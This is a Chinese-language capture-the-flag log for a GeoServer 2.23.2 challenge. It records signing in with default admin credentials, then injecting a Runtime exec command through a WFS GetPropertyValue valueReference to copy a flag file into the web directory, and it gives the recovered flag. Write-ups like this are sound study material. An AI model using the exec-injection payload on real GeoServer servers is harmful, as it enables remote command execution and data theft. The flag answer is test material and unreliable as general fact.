# c-04 · 探索记录

对应题解：[`c-04.md`](./c-04.md)

## 目标与起点

容器开了 8080 和 5005。先确认 8080 上是不是 GeoServer，再用默认管理账号看版本。

## 第一阶段：WFS 表达式把文件复制出来

`admin` / `geoserver` 可以读 `/geoserver/rest/about/version.json`，版本是 `2.23.2`。

`GetPropertyValue` 的 `valueReference` 写成 `exec(java.lang.Runtime.getRuntime(),'cp /challenge/flag.txt /mnt/geoserver/data_dir/www/flag.txt')`。WFS 返回 400，正文是 `ClassCastException`：`ProcessImpl` 不能当成 `AttributeDescriptor`。命令本身已经执行。随后 `GET /geoserver/www/flag.txt` 是 `flag{c349f75c-9170-4e57-b309-f1a8f957b465}`。同一份内容也能从带认证的 `/geoserver/rest/resource/www/flag.txt` 读到。平台接受。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 指望 WFS 响应正文里直接出现 flag | 没有 | HTTP 400，异常是 `ClassCastException`，正文里没有 `flag{...}` |
| 用 5005 这一个端口 | 这次不需要 | flag 已经从 8080 的 www 目录读到 |

## 这次真正的收获

GeoServer 2.23.2 的 WFS 属性表达式会执行 `exec`。异常不代表命令没跑。把 flag 复制到数据目录的 www 之后，匿名 GET 就能读到。
